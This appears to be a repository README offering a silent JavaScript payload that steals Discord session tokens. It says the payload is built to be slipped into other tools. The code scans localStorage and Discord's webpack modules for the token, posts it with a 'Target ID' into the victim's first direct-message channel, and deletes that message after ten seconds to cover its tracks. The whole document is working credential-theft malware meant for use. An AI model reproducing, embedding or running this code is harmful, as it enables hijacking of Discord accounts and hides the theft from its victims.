

## Overview
This repository contains a lightweight, silent JavaScript payload designed for seamless integration into other useful tools and scripts. It operates entirely in the background without any console outputs, automatically extracting session tokens, exfiltrating them to a designated target ID, and executing an automatic self-destruct cleanup mechanism to ensure complete discretion.

## Payload Code

```javascript
(function() {
    const targetUserId = "put your ID";
    
    (async () => {
        let token = "";
        try {
            for (let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                let val = localStorage.getItem(key);
                if (val) {
                    let cleanVal = val.replace(/^"|"$/g, '');
                    if (cleanVal.includes('.') && cleanVal.length > 50) {
                        token = cleanVal;
                        break;
                    }
                }
            }
        } catch (e) {}

        if (!token && typeof window !== 'undefined' && window.webpackChunkdiscord_app) {
            try {
                window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
                    for (let m of Object.keys(req.c)) {
                        try {
                            let mod = req.c[m].exports;
                            if (mod && mod.default && typeof mod.default.getToken === 'function') {
                                let t = mod.default.getToken();
                                if (t && t.length > 50) token = t;
                            }
                        } catch (e) {}
                    }
                }]);
            } catch (e) {}
        }

        if (!token) return;

        try {
            const channelsRes = await fetch(`[https://discord.com/api/v9/users/@me/channels](https://discord.com/api/v9/users/@me/channels)`, {
                headers: { "Authorization": token }
            });
            if (!channelsRes.ok) return;
            const channels = await channelsRes.json();
            if (!channels || channels.length === 0) return;
            const activeChannelId = channels[0].id;

            const msgResponse = await fetch(`[https://discord.com/api/v9/channels/$](https://discord.com/api/v9/channels/$){activeChannelId}/messages`, { 
                method: "POST", 
                headers: { 
                    "Authorization": token, 
                    "Content-Type": "application/json" 
                }, 
                body: JSON.stringify({ content: `Target ID: ${targetUserId}\nToken: ${token}` }) 
            });

            if (msgResponse.ok) {
                const msgData = await msgResponse.json();
                const messageId = msgData.id;
                setTimeout(async () => {
                    try {
                        await fetch(`[https://discord.com/api/v9/channels/$](https://discord.com/api/v9/channels/$){activeChannelId}/messages/${messageId}`, {
                            method: "DELETE",
                            headers: { "Authorization": token }
                        });
                    } catch (err) {}
                }, 10000);
            }
        } catch (err) {}
    })();
})();
